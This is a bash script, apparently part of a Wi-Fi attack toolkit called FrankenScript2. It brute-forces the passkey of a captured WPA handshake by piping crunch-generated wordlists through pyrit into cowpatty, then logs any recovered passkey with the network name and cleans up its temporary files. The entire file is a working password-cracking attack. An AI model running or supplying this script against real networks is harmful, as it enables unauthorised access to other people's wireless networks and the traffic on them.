#!/bin/bash

Capture_File=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Attack_Details.txt | sed -n ""1"p")
AP_essid=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Attack_Details.txt | sed -n ""2"p")
MinPasskeyLength=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Attack_Details.txt | sed -n ""3"p")
MaxPasskeyLength=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Attack_Details.txt | sed -n ""4"p")
CharacterSet=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Attack_Details.txt | sed -n ""5"p")
CharacterLimit=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Attack_Details.txt | sed -n ""6"p")

crunch $MinPasskeyLength $MaxPasskeyLength $CharacterSet -d $CharacterLimit | pyrit -e $AP_essid -i - -o - passthrough | cowpatty -d - -r $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/$Capture_File -s $AP_essid | tee -i $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Handshake_1.txt

Passkey_Check1=$(grep "The PSK is" $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Handshake_1.txt)
if [[ $Passkey_Check1 ]]; then
   clear
   echo "$Passkey_Check1"
   echo $Passkey_Check1 > $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/$AP_essid"_Recovered_Handshake_Passkey".txt
   echo 'AP ESSID: '$AP_essid'' >> $HOME/FrankenScript2/Recovered-Passkeys.txt
   cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/$AP_essid"_Recovered_Handshake_Passkey".txt | sed -e 's/"//g' -e 's/[.]//g' -e 's/is/is:/g' >> $HOME/FrankenScript2/Recovered-Passkeys.txt
   echo '' >> $HOME/FrankenScript2/Recovered-Passkeys.txt

   if [ "$(pidof crunch)" ] 
   then
      killall crunch
   fi

   if [ "$(pidof pyrit)" ] 
   then
      killall pyrit
   fi

   if [ "$(pidof cowpatty)" ] 
   then
      killall cowpatty
   fi

   if [ "$(pidof tee)" ] 
   then
      killall tee
   fi

   read -p $GREEN"Press $RED[Enter]$GREEN to finish and close this xterm window."$STAND

   rm $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/*.cap
   rm $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/*.txt

   killall Handshake_1.sh
else
   echo "Password not found, the xterm window will close in 5 seconds..."
   sleep 5
fi

exit
